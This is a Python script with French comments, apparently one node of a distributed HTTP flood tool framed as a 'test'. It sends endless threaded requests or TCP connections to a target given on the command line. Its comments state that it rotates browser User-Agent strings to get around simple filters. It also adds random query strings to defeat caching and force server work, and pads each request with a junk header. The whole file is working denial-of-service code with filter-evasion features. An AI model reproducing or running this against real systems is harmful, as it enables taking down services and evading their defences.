import sys
import requests
import threading
import time
import socket
import random  # AJOUT : Pour choisir un navigateur au hasard
import uuid    # AJOUT : Pour générer des URLs uniques anti-cache

if len(sys.argv) < 3:
    print("[Erreur] Paramètres manquants (Cible et Type requis).")
    sys.exit(1)

cible = sys.argv[1]
type_cible = sys.argv[2]

if type_cible == "1":
    if not cible.startswith("http://") and not cible.startswith("https://"):
        cible = "http://" + cible
    print(f"[Démarrage] Test Layer 7 (HTTP) sur la cible : {cible}", flush=True)
elif type_cible == "2":
    print(f"[Démarrage] Test Connectivité (IP) sur la cible : {cible}", flush=True)

compteur = 0
verrou = threading.Lock()

# AJOUT : Liste de vraies signatures de navigateurs pour contourner les filtres simples
liste_navigateurs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.1"
]

def travail_noeud():
    global compteur
    session = requests.Session()
    
    while True:
        try:
            if type_cible == "1":
                # MODIFICATION 1 : On change de User-Agent à chaque nouvelle requête
                entetes = {
                    'User-Agent': random.choice(liste_navigateurs),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'X-Custom-Payload': 'X' * 1024
                }
                
                # MODIFICATION 2 : On ajoute un identifiant unique à l'URL pour forcer le serveur à travailler (anti-cache)
                # Ex: http://example.com...
                url_dynamique = f"{cible}?bypass={uuid.uuid4().hex}"
                
                # Envoi de la requête modifiée
                session.get(url_dynamique, headers=entetes, timeout=3)
                
            elif type_cible == "2":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((cible, 80))
                s.close()
                
        except (requests.RequestException, socket.error):
            pass
        
        with verrou:
            compteur += 1
            if compteur % 10 == 0:
                print(f"[Nœud] Opérations traitées par ce conteneur : {compteur}", flush=True)
        
        time.sleep(0.2)

for i in range(2):
    threading.Thread(target=travail_noeud, daemon=True).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("[Fin] Arrêt du nœud de test.")
